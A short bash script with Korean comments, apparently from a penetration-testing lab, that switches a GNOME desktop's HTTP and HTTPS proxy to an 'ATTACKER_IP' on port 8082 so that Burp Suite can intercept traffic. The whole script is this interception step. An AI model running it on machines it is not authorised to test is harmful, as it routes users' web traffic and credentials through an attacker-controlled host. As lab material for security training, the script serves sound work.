#!/bin/bash

# 1. 공격자 설정 정보 (스크린샷에 맞춰 수정)
ATTACKER_IP="172.16.24.105"
PORT=8082

# 2. 프록시 모드를 'manual'로 변경 (GUI의 'Manual' 토글 클릭 효과)
gsettings set org.gnome.system.proxy mode 'manual'

# 3. HTTP 프록시 설정
gsettings set org.gnome.system.proxy.http host "$ATTACKER_IP"
gsettings set org.gnome.system.proxy.http port $PORT

# 4. HTTPS 프록시 설정 (버프스위트로 패킷을 보려면 이 설정이 필수입
니다!)
gsettings set org.gnome.system.proxy.https host "$ATTACKER_IP"
gsettings set org.gnome.system.proxy.https port $PORT

# 5. (선택사항) 모든 프로토콜에 동일한 프록시 사용 여부 (일부 버전>용)
gsettings set org.gnome.system.proxy use-same-proxy true

echo "Proxy set to $ATTACKER_IP:$PORT"

